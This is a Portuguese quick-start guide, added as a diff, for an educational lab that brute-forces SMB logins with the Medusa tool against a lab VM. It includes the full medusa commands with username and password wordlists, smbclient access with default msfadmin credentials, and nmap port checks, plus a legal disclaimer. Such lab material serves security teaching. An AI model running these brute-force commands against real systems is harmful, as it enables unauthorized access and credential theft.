@@ -1,0 +1,114 @@
+╔════════════════════════════════════════════════════════════════╗
+║                    GUIA RÁPIDO DE USO                          ║
+║              Medusa SMB Brute Force Attack Lab                 ║
+╚════════════════════════════════════════════════════════════════╝
+
+📦 INSTALAÇÃO RÁPIDA
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. Clonar o repositório:
+   git clone https://github.com/seu-usuario/medusa-smb-attack.git
+   cd medusa-smb-attack
+
+2. Instalar dependências:
+   sudo apt update
+   sudo apt install medusa smbclient -y
+
+3. Dar permissões de execução:
+   chmod +x scripts/*.sh
+
+
+⚡ USO RÁPIDO (3 PASSOS)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+PASSO 1: Configurar IP do alvo
+   nano config.conf
+   # Altere: TARGET_IP=192.168.56.101
+
+PASSO 2: Executar o ataque
+   cd scripts/
+   ./ataque_medusa.sh 192.168.56.101
+
+PASSO 3: Validar credenciais encontradas
+   ./validar_acesso.sh 192.168.56.101 msfadmin msfadmin
+
+
+🎯 COMANDOS ESSENCIAIS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Preparar wordlists
+./scripts/preparar_wordlists.sh
+
+# Ataque básico
+medusa -h [IP] -U wordlists/usuarios.txt -P wordlists/senhas.txt -M smbnt -f
+
+# Ataque com mais threads (mais rápido/agressivo)
+medusa -h [IP] -U wordlists/usuarios.txt -P wordlists/senhas.txt -M smbnt -t 10 -f
+
+# Validar acesso SMB
+smbclient -L //[IP]/ -U [usuario]
+
+# Acessar compartilhamento
+smbclient //[IP]/tmp -U [usuario]
+
+
+🔍 DIAGNÓSTICO DE PROBLEMAS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Testar conectividade
+ping -c 4 [IP]
+
+# Verificar portas SMB abertas
+nmap -p 139,445 [IP]
+
+# Verificar se Medusa está instalado
+medusa -V
+
+# Listar interfaces de rede
+ip addr show
+
+
+📋 ESTRUTURA DO REPOSITÓRIO
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+medusa-smb-attack/
+├── wordlists/           → Listas de usuários e senhas
+├── scripts/             → Scripts automatizados
+├── config.conf          → Configurações do laboratório
+├── README.md            → Documentação completa
+└── LICENSE              → Licença MIT
+
+
+⚠️  AVISO LEGAL
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+✅ Use apenas em ambientes controlados (laboratórios, VMs)
+✅ Obtenha autorização por escrito antes de testar
+❌ Uso não autorizado é ILEGAL
+❌ Autor não se responsabiliza por uso indevido
+
+
+🎓 OBJETIVO EDUCACIONAL
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Este laboratório demonstra:
+• Vulnerabilidades de credenciais fracas
+• Ataques de força bruta automatizados
+• Importância de políticas de segurança
+• Técnicas de Ethical Hacking
+
+
+📞 SUPORTE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Leia o README.md completo para:
+• Guia passo a passo detalhado
+• Troubleshooting completo
+• Mitigações e boas práticas
+• Referências e recursos adicionais
+
+
+═══════════════════════════════════════════════════════════════════
+            Desenvolvido para Cybersecurity Education
+               Use com Responsabilidade | Aprenda Ética
+═══════════════════════════════════════════════════════════════════
